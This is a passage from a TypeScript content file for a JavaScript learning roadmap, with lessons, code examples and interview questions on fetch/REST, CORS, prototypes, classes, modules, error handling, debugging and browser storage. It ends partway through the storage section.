// JavaScript roadmap, part 3: phases 9-13 (fetch and REST, classes and prototypes, modules/errors/debugging, browser APIs, security and testing).
import type { SubTopic } from './types';
import { blk, phase, topic } from './jsRoadmapKit';

export const jsRoadmap3: SubTopic[] = [
  phase(9, 'Fetch API and REST Integration', 'Essential', [
    topic(
      'jsr-fetch-crud',
      'Fetch: GET, POST, PUT and DELETE',
      [
        blk(`<h3>Talking to a REST API</h3>
• <code>fetch(url, options)</code> returns a promise of a <code>Response</code>. Read the body with <code>response.json()</code>, <code>.text()</code> or <code>.blob()</code> (each is itself a promise).<br>
• REST maps HTTP verbs to actions: <b>GET</b> read, <b>POST</b> create, <b>PUT/PATCH</b> update, <b>DELETE</b> remove. Status codes tell the result: 200 OK, 201 Created, 204 No Content, 400 Bad Request, 401/403 auth, 404 Not Found, 500 server error.`,
          `async function getUsers() {
  const res = await fetch("/api/users");
  const users = await res.json();
  console.log(users);              // [{ id: 1, name: "Asha" }, ...]
}

async function createUser(user) {
  const res = await fetch("/api/users", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(user),
  });
  return res.json();               // the created user with its new id
}
createUser({ name: "Ravi", email: "ravi@example.com" });`,
        ),
      ],
      [
        blk(`<h3>Always check response.ok</h3>
• <code>fetch</code> rejects <b>only on network failure</b>. A 404 or 500 still <em>resolves</em>, so check <code>response.ok</code> (status 200-299) yourself.<br>
• Wrap this in one small helper and use it everywhere so every call handles errors the same way.<br>
• Read the error body when the API returns details (validation messages) before throwing.`,
          `async function api(path, options = {}) {
  const res = await fetch("/api" + path, {
    headers: { "Content-Type": "application/json", ...options.headers },
    ...options,
    body: options.body ? JSON.stringify(options.body) : undefined,
  });
  if (!res.ok) {
    const problem = await res.json().catch(() => ({}));
    const err = new Error(problem.message || res.status + " " + res.statusText);
    err.status = res.status;
    throw err;
  }
  return res.status === 204 ? null : res.json();
}

api("/users/1", { method: "PUT", body: { name: "Asha K" } })
  .then(u => console.log("updated", u))
  .catch(e => console.error(e.status, e.message));
api("/users/1", { method: "DELETE" });          // resolves to null (204)`,
        ),
      ],
      [
        blk(`<h3>Query strings, headers and request types</h3>
• Build query strings with <code>URLSearchParams</code>, never by hand: it encodes special characters.<br>
• Send files with <code>FormData</code> and do <b>not</b> set <code>Content-Type</code> yourself (the browser adds the multipart boundary).<br>
• Conditional requests with <code>ETag</code>/<code>If-None-Match</code> and the <code>cache</code> option save bandwidth.<br>
• <code>keepalive: true</code> lets a request outlive page unload (analytics).`,
          `const params = new URLSearchParams({ q: "java & js", page: 2, size: 10 });
console.log("/api/search?" + params);   // /api/search?q=java+%26+js&page=2&size=10

const form = new FormData();
form.append("avatar", fileInput.files[0]);
form.append("userId", "7");
await fetch("/api/avatar", { method: "POST", body: form });   // no manual Content-Type

const res = await fetch("/api/report", { headers: { "If-None-Match": savedEtag } });
if (res.status === 304) console.log("use the cached copy");`,
        ),
      ],
      [
        ['Does fetch reject on HTTP 404 or 500?', 'No. It rejects only when the request cannot complete (network failure, CORS block, abort). For HTTP errors the promise resolves with response.ok === false, so you must check ok or status.'],
        ['Why is response.json() asynchronous?', 'The body arrives as a stream. Reading and parsing it takes time, so json(), text() and blob() return promises. A body can be read only once (clone() if needed).'],
        ['How do you send JSON with fetch?', 'method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data).'],
      ],
    ),
    topic(
      'jsr-fetch-abort-cors',
      'Timeouts, Cancellation and CORS',
      [
        blk(`<h3>Cancelling a request</h3>
• <code>AbortController</code> gives you a <code>signal</code> to pass to <code>fetch</code>. Calling <code>controller.abort()</code> rejects the promise with an <code>AbortError</code>.<br>
• <code>AbortSignal.timeout(ms)</code> creates a signal that aborts automatically.<br>
• Cancel requests when a component unmounts or when a newer search supersedes an older one.`,
          `const controller = new AbortController();
fetch("/api/slow", { signal: controller.signal })
  .then(r => r.json())
  .catch(err => {
    if (err.name === "AbortError") console.log("cancelled");
    else throw err;
  });
setTimeout(() => controller.abort(), 100);

// Built-in timeout
try {
  const res = await fetch("/api/report", { signal: AbortSignal.timeout(5000) });
} catch (e) {
  console.log(e.name);        // TimeoutError
}`,
        ),
      ],
      [
        blk(`<h3>CORS: why the browser blocks your call</h3>
• Browsers enforce the <b>same-origin policy</b>: a page on <code>http://localhost:5173</code> cannot read a response from <code>http://localhost:3001</code> unless that server allows it with <code>Access-Control-Allow-Origin</code>.<br>
• "Non-simple" requests (JSON content type, custom headers, PUT/DELETE) trigger a <b>preflight</b> <code>OPTIONS</code> request first.<br>
• Fix CORS on the <b>server</b> (or proxy through the dev server). In Spring Boot use <code>@CrossOrigin</code> or a global <code>CorsConfigurationSource</code>; allow only your own origins.<br>
• Sending cookies cross-origin needs <code>credentials: "include"</code> on the client and <code>Access-Control-Allow-Credentials: true</code> plus an explicit (not <code>*</code>) origin on the server.`,
          `// Browser console error: "blocked by CORS policy: No 'Access-Control-Allow-Origin' header"
fetch("http://localhost:3001/api/users", { credentials: "include" });

// Vite dev proxy avoids CORS during development (vite.config.ts):
// server: { proxy: { "/api": "http://localhost:3001" } }

// Spring Boot (Java) - allow only the front-end origin:
// @Bean CorsConfigurationSource cors() {
//   var c = new CorsConfiguration();
//   c.setAllowedOrigins(List.of("https://app.example.com"));
//   c.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE"));
//   c.setAllowCredentials(true);
//   var s = new UrlBasedCorsConfigurationSource();
//   s.registerCorsConfiguration("/api/**", c);
//   return s;
// }`,
        ),
      ],
      [
        blk(`<h3>Authentication and robust clients</h3>
• Send tokens in the <code>Authorization: Bearer ...</code> header. Prefer <b>HttpOnly, Secure, SameSite cookies</b> for session tokens so JavaScript (and therefore XSS) cannot read them.<br>
• Handle 401 centrally: refresh the token once, retry the request, otherwise redirect to login.<br>
• Add retries with backoff for idempotent calls only; show loading and error states in the UI; debounce search requests.<br>
• Validate and normalise API data at the boundary (a schema library such as Zod) so bad responses fail early with a clear message.`,
          `let accessToken = null;
async function authedFetch(url, options = {}, retried = false) {
  const res = await fetch(url, {
    ...options,
    headers: { ...options.headers, Authorization: "Bearer " + accessToken },
  });
  if (res.status === 401 && !retried) {
    const r = await fetch("/api/auth/refresh", { method: "POST", credentials: "include" });
    if (r.ok) { accessToken = (await r.json()).token; return authedFetch(url, options, true); }
    location.href = "/login";
  }
  return res;
}`,
        ),
      ],
      [
        ['What is CORS and who fixes it?', 'A browser security rule that blocks cross-origin reads unless the server opts in with Access-Control-Allow-* headers. The fix is on the server (or via a dev proxy), not in client JavaScript.'],
        ['What is a preflight request?', 'An automatic OPTIONS request the browser sends before a non-simple cross-origin request to ask whether the real method and headers are allowed.'],
        ['How do you cancel a fetch?', 'Pass an AbortSignal from an AbortController (or AbortSignal.timeout) and call abort(); the promise rejects with AbortError.'],
      ],
    ),
    topic(
      'jsr-rest-client-spring',
      'Mini Project: REST Client for a Spring Boot API',
      [
        blk(`<h3>What we are building</h3>
• A small "tasks" page that lists, adds, completes and deletes tasks through a Spring Boot REST API (<code>GET /api/tasks</code>, <code>POST /api/tasks</code>, <code>PATCH /api/tasks/{id}</code>, <code>DELETE /api/tasks/{id}</code>).<br>
• It puts together fetch, async/await, error handling, DOM rendering and event delegation from the earlier phases.`,
          `<!-- index.html -->
<form id="add"><input name="title" required><button>Add</button></form>
<p id="status" role="status"></p>
<ul id="tasks"></ul>

// app.js
const list = document.querySelector("#tasks");
const status = document.querySelector("#status");

async function api(path, options) {
  const res = await fetch("/api/tasks" + path, {
    headers: { "Content-Type": "application/json" }, ...options,
  });
  if (!res.ok) throw new Error("Request failed: " + res.status);
  return res.status === 204 ? null : res.json();
}`,
        ),
      ],
      [
        blk(`<h3>Rendering and events</h3>
• Render from data with DOM methods (<code>textContent</code>), keep a single <code>render(tasks)</code> function and call it after every change.<br>
• Use event delegation on the list for the complete and delete buttons.<br>
• Show a status message while loading and when something fails.`,
          `function render(tasks) {
  list.replaceChildren(...tasks.map(t => {
    const li = document.createElement("li");
    li.dataset.id = t.id;
    li.className = t.done ? "done" : "";
    const label = document.createElement("span");
    label.textContent = t.title;                    // safe against HTML injection
    const done = Object.assign(document.createElement("button"), { textContent: "Done", className: "toggle" });
    const del  = Object.assign(document.createElement("button"), { textContent: "Delete", className: "remove" });
    li.append(label, done, del);
    return li;
  }));
}

async function load() {
  status.textContent = "Loading...";
  try { render(await api("")); status.textContent = ""; }
  catch (e) { status.textContent = e.message; }
}

document.querySelector("#add").addEventListener("submit", async e => {
  e.preventDefault();
  const title = new FormData(e.target).get("title").trim();
  await api("", { method: "POST", body: JSON.stringify({ title }) });
  e.target.reset(); load();
});

list.addEventListener("click", async e => {
  const li = e.target.closest("li"); if (!li) return;
  if (e.target.matches(".toggle")) await api("/" + li.dataset.id, { method: "PATCH", body: JSON.stringify({ done: true }) });
  if (e.target.matches(".remove")) await api("/" + li.dataset.id, { method: "DELETE" });
  load();
});
load();`,
        ),
      ],
      [
        blk(`<h3>The Spring Boot side and improvements</h3>
• The controller returns JSON and proper status codes (<code>201 Created</code> with a <code>Location</code> header, <code>204</code> for delete, <code>404</code> when missing); validate input with <code>@Valid</code>.<br>
• Improve the client: optimistic updates (update the UI first, roll back on failure), debounced search, pagination via <code>?page=&amp;size=</code>, and a retry button on errors.<br>
• Keep API paths in one place so a base-URL change is a one-line edit.`,
          `// Spring Boot controller (Java)
// @RestController @RequestMapping("/api/tasks")
// class TaskController {
//   @GetMapping List<Task> all() { return repo.findAll(); }
//   @PostMapping ResponseEntity<Task> create(@Valid @RequestBody TaskRequest r) {
//     Task saved = repo.save(new Task(r.title()));
//     return ResponseEntity.created(URI.create("/api/tasks/" + saved.getId())).body(saved);
//   }
//   @DeleteMapping("/{id}") ResponseEntity<Void> delete(@PathVariable long id) {
//     repo.deleteById(id); return ResponseEntity.noContent().build();
//   }
// }

// Optimistic update with rollback (client)
async function toggle(task) {
  const previous = task.done;
  task.done = !previous; render(state.tasks);               // update UI immediately
  try { await api("/" + task.id, { method: "PATCH", body: JSON.stringify({ done: task.done }) }); }
  catch { task.done = previous; render(state.tasks); status.textContent = "Could not save"; }
}`,
        ),
      ],
      [
        ['What are optimistic updates?', 'Updating the UI immediately assuming the request will succeed, then rolling back (and informing the user) if it fails. It makes the app feel instant.'],
        ['Which status code should a successful POST that creates a resource return?', '201 Created, with a Location header pointing to the new resource; 200 is acceptable but less precise.'],
        ['Why use textContent instead of innerHTML when rendering API data?', 'API data may contain user-supplied text. textContent treats it as plain text, preventing HTML/script injection (XSS).'],
      ],
    ),
  ]),

  phase(10, 'Classes, Prototypes, OOP', 'Important', [
    topic(
      'jsr-prototypes',
      'Prototypes and the Prototype Chain',
      [
        blk(`<h3>Objects inherit from objects</h3>
• Every object has a hidden link to another object, its <b>prototype</b>. When a property is not found on the object, JavaScript looks it up the prototype chain until it reaches <code>null</code>.<br>
• Read the link with <code>Object.getPrototypeOf(obj)</code>. Create an object with a chosen prototype using <code>Object.create(proto)</code>.<br>
• Methods placed on a shared prototype exist once in memory, instead of being copied into every object.`,
          `const animal = {
  speak() { return this.name + " makes a sound"; },
};
const dog = Object.create(animal);   // dog's prototype is animal
dog.name = "Rex";
dog.bark = function () { return this.name + " barks"; };

console.log(dog.speak());            // Rex makes a sound  (found on the prototype)
console.log(dog.bark());             // Rex barks          (own property)
console.log(Object.getPrototypeOf(dog) === animal);   // true
console.log(Object.hasOwn(dog, "speak"));             // false`,
        ),
      ],
      [
        blk(`<h3>Constructor functions and the prototype property</h3>
• A function used with <code>new</code> builds an object whose prototype is <code>Fn.prototype</code>.<br>
• Put methods on <code>Fn.prototype</code> so all instances share them; put per-instance data on <code>this</code> in the constructor.<br>
• <code>instanceof</code> checks whether <code>Fn.prototype</code> appears in the object's chain.<br>
• Chain constructors for inheritance with <code>Object.setPrototypeOf</code> or <code>Child.prototype = Object.create(Parent.prototype)</code> (the ES6 <code>class extends</code> syntax does this for you).`,
          `function Person(name) { this.name = name; }
Person.prototype.greet = function () { return "Hi, " + this.name; };

function Student(name, course) { Person.call(this, name); this.course = course; }
Student.prototype = Object.create(Person.prototype);
Student.prototype.constructor = Student;
Student.prototype.study = function () { return this.name + " studies " + this.course; };

const s = new Student("Asha", "JS");
console.log(s.greet(), "|", s.study());   // Hi, Asha | Asha studies JS
console.log(s instanceof Student, s instanceof Person);   // true true
console.log(s.hasOwnProperty("greet"));    // false (it is on the prototype)`,
        ),
      ],
      [
        blk(`<h3>Pitfalls and performance</h3>
• Never mutate built-in prototypes (<code>Array.prototype.myMethod = ...</code>): it can clash with future language features and with other libraries.<br>
• <code>for...in</code> also lists inherited enumerable properties; filter with <code>Object.hasOwn</code>.<br>
• Reassigning <code>__proto__</code> at runtime deoptimises engines. Set the prototype at creation time instead.<br>
• Property lookup walks the chain: very deep chains cost a little time; engines cache lookups with hidden classes (inline caches).`,
          `const base = { shared: "from proto" };
const obj = Object.create(base);
obj.own = "mine";
for (const k in obj) console.log(k);                 // own, shared (inherited included)
for (const k in obj) if (Object.hasOwn(obj, k)) console.log("own only:", k);   // own

const noProto = Object.create(null);                 // a true dictionary
noProto.toString = "just a key";
console.log("toString" in {}, "toString" in noProto);// true true (own key now) - but no inherited methods

console.log(Object.getPrototypeOf([]) === Array.prototype);    // true
console.log(Object.getPrototypeOf(Array.prototype) === Object.prototype); // true`,
        ),
      ],
      [
        ['What is the prototype chain?', 'The linked list of objects searched when a property is not found on the object itself: obj, then obj.[[Prototype]], and so on until null.'],
        ['Difference between __proto__ and prototype?', '__proto__ (properly Object.getPrototypeOf) is the actual link of an object to its prototype. prototype is a property of constructor functions: the object that becomes the [[Prototype]] of instances created with new.'],
        ['Why put methods on the prototype?', 'All instances share one copy instead of each carrying its own function, saving memory and allowing changes to propagate.'],
      ],
    ),
    topic(
      'jsr-classes-oop',
      'Classes: Fields, Getters, Static and Inheritance',
      [
        blk(`<h3>Class syntax</h3>
• <code>class</code> is syntax over prototypes: the <code>constructor</code> initialises instances; other methods live on the prototype.<br>
• <code>extends</code> creates a subclass; <code>super(...)</code> calls the parent constructor (must run before touching <code>this</code>), <code>super.method()</code> calls a parent method.<br>
• <code>static</code> members belong to the class, not instances. Classes are not hoisted like functions and must be called with <code>new</code>.`,
          `class Account {
  constructor(owner, balance = 0) {
    this.owner = owner;
    this.balance = balance;
  }
  deposit(amount) { this.balance += amount; return this; }
  toString() { return this.owner + ": " + this.balance; }
  static open(owner) { return new Account(owner, 100); }   // factory
}

class Savings extends Account {
  constructor(owner, balance, rate) { super(owner, balance); this.rate = rate; }
  addInterest() { return this.deposit(this.balance * this.rate); }
  toString() { return super.toString() + " @" + this.rate * 100 + "%"; }
}
const s = new Savings("Asha", 1000, 0.05);
console.log(String(s.addInterest()));   // Asha: 1050 @5%
console.log(Account.open("Ravi").balance);   // 100`,
        ),
      ],
      [
        blk(`<h3>Encapsulation with # private fields</h3>
• Names starting with <code>#</code> are truly private: not accessible outside the class body, not even via bracket notation.<br>
• Use <b>getters/setters</b> to validate on write; <code>static #count</code> and <code>static {}</code> blocks for class-level state.<br>
• Class fields can be arrow functions (<code>handle = () => {}</code>) to keep <code>this</code> bound to the instance, handy for callbacks.`,
          `class Wallet {
  #balance = 0;                        // private
  static #created = 0;
  constructor() { Wallet.#created++; }
  get balance() { return this.#balance; }
  set balance(v) {
    if (v < 0) throw new RangeError("balance cannot be negative");
    this.#balance = v;
  }
  spend(n) { this.balance = this.#balance - n; }
  static get created() { return Wallet.#created; }
}
const w = new Wallet();
w.balance = 50;
w.spend(20);
console.log(w.balance);                // 30
try { w.spend(100); } catch (e) { console.log(e.message); }  // balance cannot be negative
console.log(w.#balance);               // SyntaxError: Private field '#balance' must be declared in an enclosing class`,
        ),
      ],
      [
        blk(`<h3>Composition over inheritance and mixins</h3>
• Deep inheritance trees are brittle. Prefer <b>composition</b>: give an object collaborators it delegates to ("has-a" instead of "is-a").<br>
• A <b>mixin</b> adds behaviour to a class without a shared parent: <code>const Serializable = Base => class extends Base {...}</code>.<br>
• SOLID in JavaScript: small single-purpose classes, depend on behaviour (duck typing) rather than concrete types, extend by adding, not editing.<br>
• Use <code>Symbol.toPrimitive</code>, <code>toJSON</code> and <code>instanceof</code> customisation (<code>Symbol.hasInstance</code>) sparingly.`,
          `const Serializable = Base => class extends Base {
  serialize() { return JSON.stringify(this); }
};
const Timestamped = Base => class extends Base {
  createdAt = Date.now();
};
class User { constructor(name) { this.name = name; } }
class AuditedUser extends Timestamped(Serializable(User)) {}
const u = new AuditedUser("Asha");
console.log(u.serialize());            // {"name":"Asha","createdAt":...}

// Composition: a Logger collaborator injected into a service
class Service {
  constructor(logger) { this.logger = logger; }
  run() { this.logger.log("running"); }
}
new Service({ log: msg => console.log("[LOG]", msg) }).run();`,
        ),
      ],
      [
        ['Are JavaScript classes real classes?', 'They are syntax sugar over prototype-based inheritance. The class keyword creates a constructor function and puts methods on its prototype, with stricter rules (must use new, always strict mode, not hoisted usable).'],
        ['What does super() do?', 'In a constructor it calls the parent constructor and must run before this is used. super.method() calls the parent\'s version of a method.'],
        ['Composition vs inheritance?', 'Inheritance models "is-a" and couples a child to its parent. Composition assembles behaviour from collaborators ("has-a"), which is more flexible and easier to test.'],
      ],
    ),
  ]),

  phase(11, 'Modules, Error Handling, Debugging', 'Essential', [
    topic(
      'jsr-esm-modules',
      'ES Modules: import, export and Dynamic import',
      [
        blk(`<h3>Splitting code into files</h3>
• A module is a file with its own scope. Share things with <code>export</code> and use them with <code>import</code>.<br>
• <b>Named exports</b> (<code>export const x</code>) are imported with braces and the same name; a file may have one <b>default export</b> imported with any name.<br>
• In the browser load a module with <code>&lt;script type="module" src="main.js"&gt;</code>. Modules are strict mode and deferred by default.`,
          `// math.js
export const PI = 3.14159;
export function area(r) { return PI * r * r; }
export default function double(n) { return n * 2; }

// main.js
import double, { PI, area as circleArea } from "./math.js";
console.log(double(4), PI, circleArea(2));   // 8 3.14159 12.56636

import * as math from "./math.js";           // namespace import
console.log(math.area(1));`,
        ),
      ],
      [
        blk(`<h3>Live bindings, dynamic import and re-exports</h3>
• Imports are <b>live read-only views</b> of the exporting module's variables, not copies; the importer cannot assign to them.<br>
• <code>import("./chart.js")</code> loads a module on demand and returns a promise: code splitting and lazy loading.<br>
• Re-export to build a clean public API: <code>export { Button } from "./Button.js"</code> in an <code>index.js</code> barrel file.<br>
• A module is evaluated <b>once</b> and cached, so module-level state acts as a singleton.`,
          `// counter.js
export let count = 0;
export function inc() { count++; }

// main.js
import { count, inc } from "./counter.js";
console.log(count);   // 0
inc();
console.log(count);   // 1  (live binding)
// count = 5;         // TypeError: Assignment to constant variable (imports are read-only)

button.addEventListener("click", async () => {
  const { renderChart } = await import("./chart.js");   // loaded only when needed
  renderChart(data);
});`,
        ),
      ],
      [
        blk(`<h3>Bundlers, CommonJS and circular dependencies</h3>
• Node historically used <b>CommonJS</b> (<code>require</code>/<code>module.exports</code>); modern Node supports ES modules with <code>"type": "module"</code> or <code>.mjs</code>.<br>
• Bundlers (Vite, esbuild, webpack) resolve bare imports (<code>import React from "react"</code>), tree-shake unused exports and split code into chunks.<br>
• <b>Circular imports</b> can produce <code>undefined</code> or TDZ errors because a module sees an unfinished module. Break cycles by extracting shared code into a third module.<br>
• Prefer named exports: they refactor better and enable tree-shaking and auto-imports.`,
          `// CommonJS (older Node)
// const fs = require("fs");  module.exports = { read };

// ESM in Node (package.json: { "type": "module" })
import { readFile } from "node:fs/promises";
const text = await readFile(new URL("./data.txt", import.meta.url), "utf8");

// a.js imports b.js which imports a.js  ->  ReferenceError: Cannot access 'x' before initialization
// Fix: move the shared piece into common.js and import it from both.

console.log(import.meta.url);   // URL of the current module`,
        ),
      ],
      [
        ['Named export vs default export?', 'Named exports are imported by their exact name (many per file); a default export is one value imported under any name. Named exports are easier to tree-shake and refactor.'],
        ['Are ES module imports copies?', 'No, they are live bindings to the exported variable; changes in the exporting module are visible, and the importing side cannot reassign them.'],
        ['How do you lazy-load code?', 'Dynamic import(): const mod = await import("./heavy.js"). Bundlers turn it into a separate chunk fetched on demand.'],
      ],
    ),
    topic(
      'jsr-error-handling-deep',
      'Error Handling: try/catch, Custom Errors, Global Handlers',
      [
        blk(`<h3>try / catch / finally</h3>
• Code that may throw goes in <code>try</code>; <code>catch (err)</code> handles it; <code>finally</code> always runs (close files, hide spinners).<br>
• Throw <code>Error</code> objects, not strings: they carry a <code>name</code>, <code>message</code> and a stack trace.<br>
• Built-in types: <code>TypeError</code>, <code>RangeError</code>, <code>ReferenceError</code>, <code>SyntaxError</code>. <code>JSON.parse</code> throws a <code>SyntaxError</code> on bad input.`,
          `function parseConfig(text) {
  try {
    return JSON.parse(text);
  } catch (err) {
    console.log(err.name + ": " + err.message);
    return {};                      // safe fallback
  } finally {
    console.log("parse attempted");
  }
}
console.log(parseConfig('{"a": 1}'));   // { a: 1 }
console.log(parseConfig("{oops"));      // SyntaxError..., then {}

function divide(a, b) {
  if (b === 0) throw new RangeError("Cannot divide by zero");
  return a / b;
}
try { divide(1, 0); } catch (e) { console.log(e instanceof RangeError, e.message); }`,
        ),
      ],
      [
        blk(`<h3>Custom errors and the cause chain</h3>
• Extend <code>Error</code> for domain errors so callers can react with <code>instanceof</code>: <code>ValidationError</code>, <code>NotFoundError</code>, <code>HttpError</code>.<br>
• Attach structured data (status code, field name) as properties.<br>
• Wrap low-level errors without losing the original using <code>new Error("message", { cause: err })</code>.<br>
• Handle errors where you can do something useful; otherwise let them propagate. Do not swallow errors with an empty <code>catch</code>.`,
          `class HttpError extends Error {
  constructor(status, message, options) {
    super(message, options);
    this.name = "HttpError";
    this.status = status;
  }
}
async function loadProfile(id) {
  try {
    const res = await fetch("/api/profile/" + id);
    if (!res.ok) throw new HttpError(res.status, "Profile request failed");
    return await res.json();
  } catch (err) {
    throw new Error("Could not load profile " + id, { cause: err });   // keeps the original
  }
}
loadProfile(5).catch(e => console.log(e.message, "<-", e.cause?.status));`,
        ),
      ],
      [
        blk(`<h3>Global safety nets and async errors</h3>
• <code>window.onerror</code> / <code>addEventListener("error")</code> catches uncaught exceptions; <code>"unhandledrejection"</code> catches unhandled promise rejections. Use them to log to a monitoring service (Sentry), not to hide problems.<br>
• <code>try/catch</code> does <b>not</b> catch errors thrown inside callbacks that run later (<code>setTimeout</code>) unless the try is inside that callback; with <code>async/await</code> it works as expected.<br>
• In React, an <b>error boundary</b> catches render errors. In Express, use an error-handling middleware with four parameters.<br>
• Show friendly messages to users; log technical details (stack, request id) separately.`,
          `try {
  setTimeout(() => { throw new Error("late"); }, 0);   // NOT caught by this try
} catch (e) { console.log("never runs"); }

async function run() {
  try { await Promise.reject(new Error("rejected")); }
  catch (e) { console.log("caught:", e.message); }      // works with await
}
run();

window.addEventListener("error", e => report("error", e.message, e.error?.stack));
window.addEventListener("unhandledrejection", e => report("rejection", String(e.reason)));
function report(type, message, stack) {
  navigator.sendBeacon("/api/log", JSON.stringify({ type, message, stack, url: location.href }));
}`,
        ),
      ],
      [
        ['Does finally run after return inside try?', 'Yes. finally always runs after try/catch, even if try returns or throws; a return in finally overrides the earlier return.'],
        ['Why does try/catch not catch an error in setTimeout?', 'The callback runs later on a different call stack, after the try block has finished. Put try/catch inside the callback or use async/await.'],
        ['What is error.cause?', 'An option (ES2022) to chain errors: new Error("high-level message", { cause: lowLevelError }), preserving the original error for debugging.'],
      ],
    ),
    topic(
      'jsr-debugging',
      'Debugging: DevTools, Console and Breakpoints',
      [
        blk(`<h3>Beyond console.log</h3>
• <code>console.log</code> variants: <code>console.table(array)</code> for tabular data, <code>console.error</code>/<code>warn</code>, <code>console.group</code>, <code>console.dir(obj)</code>, <code>console.assert(cond, msg)</code>, <code>console.trace()</code> for the call path.<br>
• <code>console.time("label")</code> / <code>console.timeEnd("label")</code> measure code.<br>
• Logging <code>{ variable }</code> instead of <code>variable</code> prints the name too.`,
          `const users = [{ id: 1, name: "Asha" }, { id: 2, name: "Ravi" }];
console.table(users);
const total = 42, tax = 7.5;
console.log({ total, tax });             // { total: 42, tax: 7.5 }
console.group("Checkout");
console.warn("stock low");
console.error("payment failed");
console.groupEnd();
console.assert(users.length === 3, "expected 3 users");   // prints only on failure
console.time("sum"); let s = 0; for (let i = 0; i < 1e6; i++) s += i; console.timeEnd("sum");`,
        ),
      ],
      [
        blk(`<h3>Breakpoints and the debugger</h3>
• Open DevTools (F12) → <b>Sources</b>. Click a line number for a breakpoint; execution pauses there and you can inspect the <b>Scope</b>, <b>Call Stack</b> and <b>Watch</b> panels.<br>
• Step controls: <b>Step over</b> (F10), <b>Step into</b> (F11), <b>Step out</b> (Shift+F11), <b>Resume</b> (F8).<br>
• The <code>debugger;</code> statement pauses when DevTools is open. <b>Conditional breakpoints</b> pause only when an expression is true; <b>logpoints</b> log without editing code.<br>
• Use <b>Pause on exceptions</b> to stop at the line that throws.`,
          `function applyDiscount(price, code) {
  debugger;                              // pauses here when DevTools is open
  const rates = { SAVE10: 0.1, SAVE20: 0.2 };
  const rate = rates[code];              // inspect: is rate undefined?
  return price - price * rate;           // NaN when the code is unknown
}
console.log(applyDiscount(100, "SAVE30"));   // NaN  <- find out why by stepping

// Fix found while debugging:
const safeRate = rates[code] ?? 0;`,
        ),
      ],
      [
        blk(`<h3>Network, performance and memory debugging</h3>
• <b>Network</b> tab: check the request URL, status, payload, response, headers and timing; throttle to "Slow 3G" to test real conditions; "Preserve log" across navigations.<br>
• <b>Performance</b> tab: record, then look for long tasks (red corners) and layout thrashing. <b>Lighthouse</b> audits speed and accessibility.<br>
• <b>Memory</b> tab: take heap snapshots before and after an action; objects that keep growing and are retained by listeners or globals are leaks.<br>
• Source maps let you debug the original TypeScript/JSX instead of the minified bundle. In Node: <code>node --inspect-brk app.js</code> and attach the DevTools or VS Code debugger.`,
          `// Typical bug-hunt checklist
// 1. Reproduce with the smallest input.
// 2. Read the exact error message and the first stack frame that is YOUR code.
// 3. Check the Network tab: was the right request sent? What did the server return?
// 4. Pause on exceptions or set a breakpoint near the failure.
// 5. Verify assumptions: console.log(typeof value, value) - often it is a string, not a number.
// 6. Fix, then write a test that fails without the fix.

console.log(typeof document.querySelector("#price").value);   // "string" - not a number!
const price = Number(document.querySelector("#price").value);`,
        ),
      ],
      [
        ['How do you debug JavaScript in the browser?', 'Use DevTools: Console for logs/errors, Sources for breakpoints and stepping, Network for requests, Performance and Memory for speed and leaks. The debugger; statement also pauses execution.'],
        ['What is a source map?', 'A file mapping minified/transpiled code back to the original source so DevTools shows readable code and line numbers.'],
        ['console.log vs a breakpoint?', 'console.log is quick but static and needs code edits. A breakpoint pauses execution so you can inspect all variables, the call stack and step through logic interactively.'],
      ],
    ),
  ]),

  phase(12, 'Browser APIs and Web Storage', 'Important', [
    topic(
      'jsr-web-storage',
      'Web Storage: localStorage, sessionStorage, Cookies, IndexedDB',
      [
        blk(`<h3>Storing data in the browser</h3>
• <code>localStorage</code>: key-value strings (about 5 MB), persists until cleared, shared by tabs of the same origin. <code>sessionStorage</code>: the same, but per tab and cleared when it closes.<br>
• Values are always strings, so use <code>JSON.stringify</code> / <code>JSON.parse</code> for objects. The API is synchronous, so keep it small.<br>
• Methods: <code>setItem</code>, <code>getItem</code> (returns <code>null</code> if missing), <code>removeItem</code>, <code>clear</code>.`,
          `localStorage.setItem("theme", "dark");
console.log(localStorage.getItem("theme"));        // dark

const settings = { lang: "en", fontSize: 16 };
localStorage.setItem("settings", JSON.stringify(settings));
const loaded = JSON.parse(localStorage.getItem("settings") ?? "{}");
console.log(loaded.fontSize);                      // 16

sessionStorage.setItem("draft", "Hello...");       // gone when the tab closes
window.addEventListener("storage", e => console.log("another tab changed", e.key, e.newValue));`,
        ),
      ],
      [
        blk(`<h3>Safe usage and cookies</h3>
• Wrap storage access in <code>try/catch</code>: it can throw in private mode, when the quota is full or when storage is blocked.<br>
• <b>Never store secrets</b> (passwords, access tokens) in <code>localStorage</code>: any XSS can read it. Prefer <b>HttpOnly cookies</b> set by the server.<br>
• Cookies are sent with every request to the server; set <code>Secure</code>, <code>HttpOnly</code> and <code>SameSite=Lax|Strict</code>. Keep them small.<br>
• Version your stored data and handle missing/old shapes.`,
          `function load(key, fallback) {
  try {
    const raw = localStorage.getItem(key);
    return raw === null ? fallback : JSON.parse(raw);
  } catch { return fallback; }                    // blocked storage or corrupt JSON
}
function save(key, value) {
  try { localStorage.setItem(key, JSON.stringify(value)); return true; }
  catch (e) { console.warn("storage failed:", e.name); return false; }   // QuotaExceededError
}
save("cart", [{ sku: "A1", qty: 2 }]);
console.log(load("cart", []));

document.cookie = "visited=1; max-age=31536000; path=/; SameSite=Lax";   // client-set, readable by JS
// Server-set session cookie: Set-Cookie: sid=abc; HttpOnly; Secure; SameSite=Lax`,
        ),
      ],
      [
        blk(`<h3>IndexedDB and the Cache API</h3>
• <b>IndexedDB</b> is an asynchronous, transactional database for large structured data (hundreds of MB), blobs and offline apps. Use a wrapper like <code>idb</code> or Dexie to avoid the verbose event API.<br>
• The <b>Cache API</b> with a <b>service worker</b> stores responses so a progressive web app works offline.<br>
• Check quota with <code>navigator.storage.estimate()</code>; request persistence with <code>navigator.storage.persist()</code>.<br>
• Choose: preference flag → <code>localStorage</code>; large/offline data → IndexedDB; auth → HttpOnly cookie.`,
          `// IndexedDB with the raw API (promise wrapper shown)
const open = indexedDB.open("shop", 1);
open.onupgradeneeded = () => open.result.createObjectStore("orders", { keyPath: "id" });
open.onsuccess = () => {
  const db = open.result;
  const tx = db.transaction("orders", "readwrite");
  tx.objectStore("orders").put({ id: 1, total: 499 });
  tx.oncomplete = () => console.log("saved");
};

const { usage, quota } = await navigator.storage.estimate();
console.log(Math.round(usage / 1e6) + " MB of " + Math.round(quota / 1e6) + " MB used");`,
        ),
      ],
      [
